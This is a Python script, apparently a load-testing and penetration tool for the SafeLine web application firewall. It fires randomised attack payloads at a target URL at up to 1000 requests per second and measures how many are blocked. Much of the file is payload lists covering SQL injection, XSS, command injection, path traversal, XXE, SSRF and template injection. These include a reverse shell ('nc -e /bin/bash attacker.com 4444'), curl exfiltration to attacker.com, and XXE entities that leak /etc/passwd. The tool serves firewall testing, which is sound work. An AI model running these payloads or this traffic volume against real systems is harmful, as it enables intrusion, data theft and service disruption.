#!/usr/bin/env python3
"""
Advanced Penetration Testing Engine for SafeLine WAF
High-throughput, multi-vector attack framework capable of 1000+ RPS
"""

import asyncio
import aiohttp
import time
import json
import random
import logging
import argparse
from datetime import datetime, timedelta
from dataclasses import dataclass, asdict
from typing import List, Dict, Any, Optional
from concurrent.futures import ThreadPoolExecutor
import numpy as np
import pandas as pd

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/results/pentest.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

@dataclass
class AttackResult:
    timestamp: float
    attack_id: str
    attack_type: str
    attack_category: str
    payload: str
    method: str
    endpoint: str
    status_code: int
    response_time: float
    response_size: int
    blocked: bool
    detection_method: Optional[str] = None
    error: Optional[str] = None
    
class AdvancedAttackEngine:
    """
    High-performance attack engine for comprehensive WAF testing
    """
    
    def __init__(self, target_url: str, max_rps: int = 1000, max_concurrent: int = 500):
        self.target_url = target_url.rstrip('/')
        self.max_rps = max_rps
        self.max_concurrent = max_concurrent
        self.session = None
        self.results = []
        self.attack_id_counter = 0
        
        # Advanced attack vectors
        self.attack_vectors = {
            'sql_injection': {
                'basic': [
                    "1' OR '1'='1",
                    "1' OR 1=1--",
                    "' OR ''='",
                    "1' OR '1'='1' --",
                    "1' OR '1'='1' /*",
                ],
                'union_based': [
                    "1' UNION SELECT null,null,null--",
                    "1' UNION SELECT @@version,@@hostname,@@datadir--", 
                    "1' UNION SELECT username,password FROM users--",
                    "1' UNION SELECT null,table_name FROM information_schema.tables--",
                    "1' UNION SELECT column_name,null FROM information_schema.columns--",
                ],
                'boolean_blind': [
                    "1' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--",
                    "1' AND (SELECT COUNT(*) FROM users)>0--",
                    "1' AND (SELECT LENGTH(database()))>5--",
                    "1' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))>65--",
                ],
                'time_based': [
                    "1' AND (SELECT SLEEP(5))--",
                    "1'; WAITFOR DELAY '00:00:05'--",
                    "1' AND (SELECT * FROM (SELECT SLEEP(5))a)--",
                    "1' UNION SELECT BENCHMARK(5000000,MD5(1))--",
                ],
                'error_based': [
                    "1' AND (extractvalue(1,concat(0x7e,database())))--",
                    "1' AND (updatexml(1,concat(0x7e,@@version),1))--",
                    "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())--",
                ],
                'advanced_evasion': [
                    "1'/**/OR/**/1=1--",
                    "1' OR 1=1#",
                    "1' %4f%52 1=1--",
                    "1' /*!50000OR*/ 1=1--",
                    "1' OR 1=1 LIMIT 1--",
                    "1' OR 'x'='x",
                    "1' OR ASCII(97)=ASCII(97)--",
                    "1' OR 0x41=0x41--",
                    "1' OR CHAR(65)=CHAR(65)--"
                ]
            },
            
            'xss': {
                'basic_script': [
                    "<script>alert('XSS')</script>",
                    "<script>alert(1)</script>",
                    "<script>alert(String.fromCharCode(88,83,83))</script>",
                    "<script>alert(document.domain)</script>",
                    "<script>alert(document.cookie)</script>",
                ],
                'event_handlers': [
                    "<img src=x onerror=alert('XSS')>",
                    "<body onload=alert('XSS')>",
                    "<input onfocus=alert('XSS') autofocus>",
                    "<select onfocus=alert('XSS') autofocus>",
                    "<textarea onfocus=alert('XSS') autofocus>",
                    "<button onclick=alert('XSS')>Click</button>",
                    "<div onmouseover=alert('XSS')>Hover</div>",
                ],
                'advanced_vectors': [
                    "<svg onload=alert('XSS')>",
                    "<iframe src=javascript:alert('XSS')>",
                    "<object data=javascript:alert('XSS')>",
                    "<embed src=javascript:alert('XSS')>",
                    "<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><path onfocus=alert('XSS')>",
                ],
                'filter_evasion': [
                    "<ScRiPt>alert('XSS')</ScRiPt>",
                    "<script/src=data:,alert('XSS')>",
                    "<script>al\u0065rt('XSS')</script>",
                    "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
                    "javascript:alert('XSS')",
                    "JaVaScRiPt:alert('XSS')",
                    "java\u0000script:alert('XSS')",
                    "data:text/html,<script>alert('XSS')</script>",
                ],
                'context_breaking': [
                    "';alert('XSS');//",
                    "\";alert('XSS');//",
                    "</script><script>alert('XSS')</script>",
                    "</title><script>alert('XSS')</script>",
                    "</textarea><script>alert('XSS')</script>",
                    "</style><script>alert('XSS')</script>",
                ]
            },
            
            'command_injection': [
                "; cat /etc/passwd",
                "| whoami",
                "&& id", 
                "|| uname -a",
                "`cat /etc/shadow`",
                "$(id)",
                "; ls -la /",
                "| ps aux",
                "&& netstat -an",
                "|| cat /proc/version",
                "; curl http://attacker.com/exfil",
                "| nc -e /bin/bash attacker.com 4444",
                "&& python -c \"import os; os.system('id')\"",
                "|| perl -e 'system(\"id\")'",
                "; ruby -e 'system(\"id\")'",
                "| php -r 'system(\"id\");'",
                "&& bash -c 'id'",
                "|| sh -c 'id'",
            ],
            
            'path_traversal': [
                "../../../../etc/passwd",
                "..\\..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
                "..%2f..%2f..%2f..%2fetc%2fpasswd",
                "..%252f..%252f..%252f..%252fetc%252fpasswd",
                "....\\\\....\\\\....\\\\etc/passwd",
                "/etc/passwd%00",
                "etc/passwd%00.jpg",
                "/var/log/apache2/access.log",
                "/proc/self/environ",
                "/proc/version",
                "/proc/cmdline",
                "php://filter/read=convert.base64-encode/resource=config.php",
                "file:///etc/passwd",
                "../" * 20 + "etc/passwd",
            ],
            
            'xxe_injection': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo></foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?x=%file;\'>">%eval;%exfil;]><foo></foo>',
                '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>',
            ],
            
            'ssrf': [
                "http://localhost:22",
                "http://127.0.0.1:3306",
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "file:///etc/passwd",
                "dict://localhost:11211/stats",
                "gopher://localhost:6379/_INFO",
                "ftp://localhost/",
                "http://[::1]:80/",
                "http://0x7f000001/",
                "http://2130706433/",
                "http://localhost:5000/admin",
                "ldap://localhost:389/",
                "sftp://localhost:22/",
            ],
            
            'ssti': [
                "{{7*7}}",
                "{{config}}",
                "{{request}}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "${7*7}",
                "#{7*7}",
                "<%=7*7%>",
                "${{7*7}}",
                "{{''.__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].exit()}}",
                "{{config.items()}}",
                "{{request.environ}}",
                "{{url_for.__globals__['sys'].modules['os'].popen('id').read()}}",
            ],
            
            'nosql_injection': [
                "[$ne]=null",
                "[$regex]=.*",
                "[$where]=function(){return true}",
                "[$gt]=",
                "[$lt]=",
                "[$exists]=true",
                "[$in][]=admin",
                "[$nin][]=user",
                "'; return 1==1; var dummy='",
                "'; return this.username == 'admin'; var dummy='",
                "admin'||'1'=='1",
                "' || 1==1 //",
                "' || 1==1 %00",
                "true, $where: '1 == 1'",
            ],
            
            'ldap_injection': [
                "*)(uid=*))(|(uid=*",
                "*)(|(password=*))",
                "admin)(&(password=*))",
                "*))%00",
                "*()|%26'",
                "admin*",
                "*(cn=*)",
                "*)(|(mail=*))",
                "*)(|(objectclass=*))",
                "admin)(&(|(password=*)(password=*)))",
            ],
            
            'file_upload': [
                "shell.php",
                "shell.php.jpg", 
                "shell.jpg.php",
                "shell.php%00.jpg",
                "shell.asp",
                "shell.aspx",
                "shell.jsp",
                "shell.php5",
                "shell.phtml",
                ".htaccess",
                "web.config",
                "shell.jsp;.jpg",
                "shell.php;.gif",
                "shell.asp;.png",
            ],
            
            'protocol_attacks': [
                "X" * 65536,  # Large payload
                "\x00" * 1000,  # Null bytes
                "\r\n\r\nHTTP/1.1 200 OK\r\n\r\n<script>alert('XSS')</script>",  # HTTP Response Splitting
                "Host: evil.com",  # Host header injection
                "X-Forwarded-For: 127.0.0.1",  # IP spoofing
                "X-Real-IP: 127.0.0.1",
                "Referer: javascript:alert('XSS')",
                "User-Agent: <script>alert('XSS')</script>",
            ]
        }
        
        # Attack configurations
        self.attack_configs = [
            # SQL Injection tests
            {'type': 'sql_injection', 'category': 'basic', 'endpoint': '/api/user', 'method': 'GET', 'param': 'id'},
            {'type': 'sql_injection', 'category': 'union_based', 'endpoint': '/search', 'method': 'GET', 'param': 'q'},
            {'type': 'sql_injection', 'category': 'time_based', 'endpoint': '/login', 'method': 'POST', 'param': 'username'},
            {'type': 'sql_injection', 'category': 'boolean_blind', 'endpoint': '/product', 'method': 'GET', 'param': 'id'},
            {'type': 'sql_injection', 'category': 'error_based', 'endpoint': '/category', 'method': 'GET', 'param': 'cat'},
            {'type': 'sql_injection', 'category': 'advanced_evasion', 'endpoint': '/admin', 'method': 'POST', 'param': 'user'},
            
            # XSS tests
            {'type': 'xss', 'category': 'basic_script', 'endpoint': '/comment', 'method': 'POST', 'param': 'content'},
            {'type': 'xss', 'category': 'event_handlers', 'endpoint': '/profile', 'method': 'GET', 'param': 'name'},
            {'type': 'xss', 'category': 'advanced_vectors', 'endpoint': '/message', 'method': 'POST', 'param': 'msg'},
            {'type': 'xss', 'category': 'filter_evasion', 'endpoint': '/feedback', 'method': 'POST', 'param': 'text'},
            {'type': 'xss', 'category': 'context_breaking', 'endpoint': '/page', 'method': 'GET', 'param': 'content'},
            
            # Command Injection
            {'type': 'command_injection', 'category': 'basic', 'endpoint': '/ping', 'method': 'POST', 'param': 'host'},
            {'type': 'command_injection', 'category': 'basic', 'endpoint': '/traceroute', 'method': 'GET', 'param': 'target'},
            {'type': 'command_injection', 'category': 'basic', 'endpoint': '/nslookup', 'method': 'POST', 'param': 'domain'},
            
            # Path Traversal
            {'type': 'path_traversal', 'category': 'basic', 'endpoint': '/file', 'method': 'GET', 'param': 'path'},
            {'type': 'path_traversal', 'category': 'basic', 'endpoint': '/download', 'method': 'GET', 'param': 'file'},
            {'type': 'path_traversal', 'category': 'basic', 'endpoint': '/include', 'method': 'GET', 'param': 'page'},
            
            # XXE
            {'type': 'xxe_injection', 'category': 'basic', 'endpoint': '/api/xml', 'method': 'POST', 'param': 'xml'},
            {'type': 'xxe_injection', 'category': 'basic', 'endpoint': '/upload/xml', 'method': 'POST', 'param': 'data'},
            
            # SSRF
            {'type': 'ssrf', 'category': 'basic', 'endpoint': '/fetch', 'method': 'GET', 'param': 'url'},
            {'type': 'ssrf', 'category': 'basic', 'endpoint': '/proxy', 'method': 'POST', 'param': 'target'},
            
            # Template Injection
            {'type': 'ssti', 'category': 'basic', 'endpoint': '/template', 'method': 'POST', 'param': 'content'},
            {'type': 'ssti', 'category': 'basic', 'endpoint': '/render', 'method': 'GET', 'param': 'template'},
            
            # NoSQL Injection
            {'type': 'nosql_injection', 'category': 'basic', 'endpoint': '/api/mongo', 'method': 'POST', 'param': 'query'},
            {'type': 'nosql_injection', 'category': 'basic', 'endpoint': '/user/find', 'method': 'GET', 'param': 'filter'},
            
            # LDAP Injection
            {'type': 'ldap_injection', 'category': 'basic', 'endpoint': '/ldap/search', 'method': 'GET', 'param': 'user'},
            {'type': 'ldap_injection', 'category': 'basic', 'endpoint': '/auth/ldap', 'method': 'POST', 'param': 'username'},
            
            # Protocol attacks
            {'type': 'protocol_attacks', 'category': 'basic', 'endpoint': '/', 'method': 'GET', 'param': 'test'},
            {'type': 'protocol_attacks', 'category': 'basic', 'endpoint': '/api', 'method': 'POST', 'param': 'data'},
        ]
    
    async def create_session(self):
        """Create optimized aiohttp session for high-throughput testing"""
        connector = aiohttp.TCPConnector(
            limit=self.max_concurrent * 2,
            limit_per_host=self.max_concurrent,
            ttl_dns_cache=300,
            use_dns_cache=True,
            keepalive_timeout=60,
            enable_cleanup_closed=True,
            force_close=False,
            ssl=False
        )
        
        timeout = aiohttp.ClientTimeout(
            total=30,
            connect=10,
            sock_read=10
        )
        
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={
                'User-Agent': 'SafeLine-PenTest-Engine/2.0',
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'Accept-Encoding': 'gzip, deflate'
            }
        )
        
        logger.info(f"Created session with {self.max_concurrent} max concurrent connections")
    
    def get_next_attack_id(self) -> str:
        """Generate unique attack ID"""
        self.attack_id_counter += 1
        return f"ATK_{self.attack_id_counter:06d}"
    
    async def execute_single_attack(self, config: Dict, payload: str) -> AttackResult:
        """Execute a single attack and return result"""
        attack_id = self.get_next_attack_id()
        start_time = time.time()
        
        try:
            url = f"{self.target_url}{config['endpoint']}"
            method = config['method'].upper()
            param_name = config['param']
            
            if method == 'GET':
                params = {param_name: payload}
                async with self.session.get(url, params=params) as response:
                    response_time = time.time() - start_time
                    content = await response.text()
                    
                    return AttackResult(
                        timestamp=start_time,
                        attack_id=attack_id,
                        attack_type=config['type'],
                        attack_category=config.get('category', 'basic'),
                        payload=payload,
                        method=method,
                        endpoint=config['endpoint'],
                        status_code=response.status,
                        response_time=response_time,
                        response_size=len(content),
                        blocked=self._is_blocked(response.status, content),
                        detection_method=self._detect_waf_signature(response.headers, content)
                    )
            
            elif method == 'POST':
                data = {param_name: payload}
                async with self.session.post(url, data=data) as response:
                    response_time = time.time() - start_time
                    content = await response.text()
                    
                    return AttackResult(
                        timestamp=start_time,
                        attack_id=attack_id,
                        attack_type=config['type'],
                        attack_category=config.get('category', 'basic'),
                        payload=payload,
                        method=method,
                        endpoint=config['endpoint'],
                        status_code=response.status,
                        response_time=response_time,
                        response_size=len(content),
                        blocked=self._is_blocked(response.status, content),
                        detection_method=self._detect_waf_signature(response.headers, content)
                    )
        
        except Exception as e:
            return AttackResult(
                timestamp=start_time,
                attack_id=attack_id,
                attack_type=config['type'],
                attack_category=config.get('category', 'basic'),
                payload=payload,
                method=config['method'],
                endpoint=config['endpoint'],
                status_code=0,
                response_time=time.time() - start_time,
                response_size=0,
                blocked=False,
                error=str(e)
            )
    
    def _is_blocked(self, status_code: int, content: str) -> bool:
        """Determine if request was blocked by WAF"""
        # Common WAF block status codes
        if status_code in [403, 406, 418, 429, 444, 499, 500]:
            return True
        
        # Check for WAF signatures in content
        waf_signatures = [
            'blocked by security policy',
            'access denied',
            'security violation',
            'malicious request',
            'attack detected',
            'safeline',
            'cloudflare',
            'cloudfront',
            'incapsula',
            'akamai',
            'sucuri'
        ]
        
        content_lower = content.lower()
        for signature in waf_signatures:
            if signature in content_lower:
                return True
        
        return False
    
    def _detect_waf_signature(self, headers, content: str) -> Optional[str]:
        """Detect WAF type from response headers and content"""
        # Check headers for WAF signatures
        header_signatures = {
            'server': ['safeline', 'cloudflare', 'cloudfront'],
            'x-powered-by': ['safeline'],
            'x-safeline': ['*'],
            'cf-ray': ['cloudflare'],
            'x-amz-cf-id': ['cloudfront'],
            'x-sucuri-id': ['sucuri']
        }
        
        for header, signatures in header_signatures.items():
            if header in headers:
                header_value = headers[header].lower()
                for sig in signatures:
                    if sig in header_value or sig == '*':
                        return f"Header: {header}={headers[header]}"
        
        # Check content for WAF signatures
        content_signatures = ['safeline', 'security policy', 'access denied']
        content_lower = content.lower()
        for sig in content_signatures:
            if sig in content_lower:
                return f"Content: {sig}"
        
        return None
    
    async def high_throughput_campaign(self, duration: int = 300, rps: int = None) -> List[AttackResult]:
        """Execute high-throughput attack campaign"""
        if rps is None:
            rps = self.max_rps
        
        logger.info(f"Starting high-throughput campaign: {duration}s duration, {rps} RPS target")
        
        results = []
        start_time = time.time()
        request_interval = 1.0 / rps
        
        # Semaphore to control concurrent requests
        semaphore = asyncio.Semaphore(self.max_concurrent)
        
        async def bounded_attack(config, payload):
            async with semaphore:
                return await self.execute_single_attack(config, payload)
        
        tasks = []
        
        while time.time() - start_time < duration:
            # Select random attack configuration and payload
            config = random.choice(self.attack_configs)
            attack_type = config['type']
            category = config.get('category', 'basic')
            
            # Get payload based on attack type and category
            if attack_type in self.attack_vectors:
                if isinstance(self.attack_vectors[attack_type], dict):
                    if category in self.attack_vectors[attack_type]:
                        payload = random.choice(self.attack_vectors[attack_type][category])
                    else:
                        payload = random.choice(list(self.attack_vectors[attack_type].values())[0])
                else:
                    payload = random.choice(self.attack_vectors[attack_type])
            else:
                payload = "test_payload"
            
            # Create attack task
            task = asyncio.create_task(bounded_attack(config, payload))
            tasks.append(task)
            
            # Process completed tasks in batches
            if len(tasks) >= 100:
                completed = []
                pending = []
                
                for task in tasks:
                    if task.done():
                        completed.append(task)
                    else:
                        pending.append(task)
                
                # Collect results from completed tasks
                for task in completed:
                    try:
                        result = await task
                        results.append(result)
                    except Exception as e:
                        logger.error(f"Task failed: {e}")
                
                tasks = pending
            
            # Rate limiting
            await asyncio.sleep(request_interval)
        
        # Wait for remaining tasks
        if tasks:
            remaining_results = await asyncio.gather(*tasks, return_exceptions=True)
            for result in remaining_results:
                if isinstance(result, AttackResult):
                    results.append(result)
                elif isinstance(result, Exception):
                    logger.error(f"Attack failed: {result}")
        
        end_time = time.time()
        actual_duration = end_time - start_time
        actual_rps = len(results) / actual_duration
        
        logger.info(f"Campaign completed: {len(results)} attacks in {actual_duration:.1f}s ({actual_rps:.1f} RPS)")
        
        return results
    
    def analyze_results(self, results: List[AttackResult]) -> Dict[str, Any]:
        """Comprehensive analysis of attack results"""
        if not results:
            return {"error": "No results to analyze"}
        
        # Convert to DataFrame for analysis
        df = pd.DataFrame([asdict(r) for r in results])
        
        # Basic statistics
        total_attacks = len(results)
        blocked_attacks = df['blocked'].sum()
        error_attacks = df['error'].notna().sum()
        detection_rate = (blocked_attacks / total_attacks) * 100
        
        # Performance metrics
        response_times = df[df['response_time'] > 0]['response_time']
        avg_response_time = response_times.mean()
        p95_response_time = response_times.quantile(0.95)
        p99_response_time = response_times.quantile(0.99)
        
        # Attack type breakdown
        attack_type_stats = df.groupby('attack_type').agg({
            'blocked': ['count', 'sum', lambda x: (x.sum() / len(x)) * 100],
            'response_time': 'mean',
            'status_code': lambda x: x.mode().iloc[0] if not x.empty else 0
        }).round(2)
        
        # Status code distribution
        status_distribution = df['status_code'].value_counts().to_dict()
        
        # Time-based analysis
        df['datetime'] = pd.to_datetime(df['timestamp'], unit='s')
        df.set_index('datetime', inplace=True)
        
        # Calculate RPS over time
        rps_timeline = df.resample('10S').size()
        detection_timeline = df.resample('10S')['blocked'].mean() * 100
        
        # WAF detection methods
        detection_methods = df[df['detection_method'].notna()]['detection_method'].value_counts()
        
        return {
            'summary': {
                'total_attacks': total_attacks,
                'blocked_attacks': blocked_attacks,
                'error_attacks': error_attacks,
                'detection_rate': detection_rate,
                'avg_response_time': avg_response_time,
                'p95_response_time': p95_response_time,
                'p99_response_time': p99_response_time
            },
            'attack_type_breakdown': attack_type_stats.to_dict(),
            'status_distribution': status_distribution,
            'rps_timeline': rps_timeline.to_dict(),
            'detection_timeline': detection_timeline.to_dict(),
            'detection_methods': detection_methods.to_dict(),
            'top_blocked_attacks': df[df['blocked'] == True]['attack_type'].value_counts().head(10).to_dict(),
            'top_bypassed_attacks': df[df['blocked'] == False]['attack_type'].value_counts().head(10).to_dict()
        }
    
    async def close(self):
        """Close the session"""
        if self.session:
            await self.session.close()
    
    async def save_results(self, results: List[AttackResult], filename: str):
        """Save results to JSON file"""
        results_data = [asdict(r) for r in results]
        
        with open(f'/results/{filename}', 'w') as f:
            json.dump({
                'metadata': {
                    'timestamp': datetime.now().isoformat(),
                    'target_url': self.target_url,
                    'max_rps': self.max_rps,
                    'total_results': len(results)
                },
                'results': results_data
            }, f, indent=2, default=str)
        
        logger.info(f"Results saved to /results/{filename}")

async def main():
    parser = argparse.ArgumentParser(description='Advanced SafeLine WAF Penetration Testing Engine')
    parser.add_argument('--target', default='http://localhost', help='Target URL')
    parser.add_argument('--rps', type=int, default=1000, help='Target requests per second')
    parser.add_argument('--duration', type=int, default=300, help='Test duration in seconds')
    parser.add_argument('--concurrent', type=int, default=500, help='Max concurrent connections')
    parser.add_argument('--output', default='pentest_results.json', help='Output filename')
    
    args = parser.parse_args()
    
    # Initialize attack engine
    engine = AdvancedAttackEngine(
        target_url=args.target,
        max_rps=args.rps,
        max_concurrent=args.concurrent
    )
    
    try:
        await engine.create_session()
        
        logger.info("=== SafeLine Advanced Penetration Testing Engine ===")
        logger.info(f"Target: {args.target}")
        logger.info(f"Duration: {args.duration} seconds")
        logger.info(f"Target RPS: {args.rps}")
        logger.info(f"Max Concurrent: {args.concurrent}")
        
        # Execute high-throughput campaign
        results = await engine.high_throughput_campaign(
            duration=args.duration,
            rps=args.rps
        )
        
        # Analyze results
        analysis = engine.analyze_results(results)
        
        # Save results
        await engine.save_results(results, args.output)
        
        # Print summary
        print("\n=== ATTACK CAMPAIGN SUMMARY ===")
        print(f"Total Attacks: {analysis['summary']['total_attacks']:,}")
        print(f"Blocked Attacks: {analysis['summary']['blocked_attacks']:,}")
        print(f"Detection Rate: {analysis['summary']['detection_rate']:.1f}%")
        print(f"Average Response Time: {analysis['summary']['avg_response_time']*1000:.2f}ms")
        print(f"95th Percentile: {analysis['summary']['p95_response_time']*1000:.2f}ms")
        print(f"99th Percentile: {analysis['summary']['p99_response_time']*1000:.2f}ms")
        
        print("\n=== TOP ATTACK TYPES (BLOCKED) ===")
        for attack_type, count in list(analysis['top_blocked_attacks'].items())[:5]:
            print(f"{attack_type}: {count}")
        
        print("\n=== STATUS CODE DISTRIBUTION ===")
        for status, count in list(analysis['status_distribution'].items())[:10]:
            print(f"{status}: {count}")
        
        # Save analysis
        with open('/results/analysis_summary.json', 'w') as f:
            json.dump(analysis, f, indent=2, default=str)
        
        logger.info("Attack campaign completed successfully")
        
    except Exception as e:
        logger.error(f"Campaign failed: {e}")
        raise
    finally:
        await engine.close()

if __name__ == "__main__":
    asyncio.run(main())